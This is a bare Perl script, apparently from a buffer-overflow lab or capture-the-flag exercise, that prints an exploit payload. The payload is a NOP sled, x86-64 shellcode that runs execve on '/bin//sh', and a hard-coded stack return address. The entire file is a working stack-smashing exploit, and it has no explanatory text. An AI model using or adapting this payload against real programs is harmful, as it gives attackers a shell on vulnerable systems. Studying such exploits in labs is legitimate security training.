#!/usr/bin/perl
print "\x90"x20;

print "\x48\x31\xc0";
print "\x48\x31\xff";
print "\x48\x31\xf6";
print "\x48\x31\xd2";
print "\x48\x31\xc9";
print "\x56";
print "\x68\x2f\x62\x69\x6e";
print "\xc7\x44\x24\x04\x2f\x2f\x73\x68";
print "\xb0\x3b";
print "\x48\x89\xe7";
print "\x0f\x05";

print "\x20\xdc\xff\xff\xff\x7f";

#0x 7f ff ff ff dc 10
